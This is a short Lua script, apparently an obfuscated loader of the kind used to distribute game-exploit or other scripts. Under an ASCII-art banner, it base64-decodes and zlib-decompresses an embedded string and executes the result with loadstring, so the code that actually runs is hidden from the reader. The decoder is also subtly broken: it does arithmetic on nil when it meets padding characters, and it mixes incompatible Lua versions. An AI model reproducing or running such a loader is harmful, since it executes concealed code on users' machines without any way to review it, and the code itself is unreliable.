--[[
 _________  ___  _____ ______   _____ ______       ___    ___ 
|\___   ___\\  \|\   _ \  _   \|\   _ \  _   \    |\  \  /  /|
\|___ \  \_\ \  \ \  \\\__\ \  \ \  \\\__\ \  \   \ \  \/  / /
     \ \  \ \ \  \ \  \\|__| \  \ \  \\|__| \  \   \ \    / / 
      \ \  \ \ \  \ \  \    \ \  \ \  \    \ \  \   \/   / /  
       \ \__\ \ \__\ \__\    \ \__\ \__\    \ \__\__/   / /   
        \|__|  \|__|\|__|     \|__|\|__|     \|__|\____/ /    
                                                 \|____|/     
        ]]--
        loadstring((function()
            local data = "eJx9kV1vgyAUhv/KSZsmMDvjB/bjwttuS9ab7XJZGkVUqkKLtuu2bL99QaVfaXYBHOC87zk8lJJGJaxUUqyjGGjOaLFKWLzLEAaeQhtCJJIusjPWcJFKaHImQNY2O/AGYSg7l/WEkBmEMJ8BE4nWy7oVy1ormdhf7hDqC58s8pLnFYMQvpHnWw4eo252g3YhBCyY4TFyDn6Af4wqifK82UEIg9fFkqqnxeND9RLQavk8OKYUpfzc6pQBpFIBD5GrLYemZCKPz/D9KYEQpt6ZzES2DXWjuMhsmkcK9eo3/g6/5iL+bBjqexoD4vcuHg37vYXcOxdj3AJSrNkpcbRmIsEI42u4OlOPy8/ZKC6aGwDpR7XhsgUYgAXzlpXn4zHyJmCBRzRMBywI9NHcck4Ut5xm1f5finXxxeO0o2hoEc9xIAQvuOLad5LIM5mJril2uTcodj21FDtyo2F/dpNkb29ImhannuPqDyV/4ePosA=="
            local function b64_decode(s)
                local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
                local t={}
                s=s:gsub('[^'..b..'=]','')
                for i=1,#s,4 do
                    local a=b:find(s:sub(i,i))-1
                    local c=b:find(s:sub(i+1,i+1))-1
                    local d=b:find(s:sub(i+2,i+2))-1
                    local e=b:find(s:sub(i+3,i+3))-1
                    if a and c and d and e then
                        table.insert(t, string.char((a<<2)|(c>>4)))
                        if s:sub(i+2,i+2)~='=' then
                            table.insert(t, string.char(((c&15)<<4)|(d>>2)))
                        end
                        if s:sub(i+3,i+3)~='=' then
                            table.insert(t, string.char(((d&3)<<6)|e))
                        end
                    end
                end
                return table.concat(t)
            end
            local z = require("zlib")
            local decoded = b64_decode(data)
            local decompressed = z.decompress(decoded)
            return decompressed
        end)())()
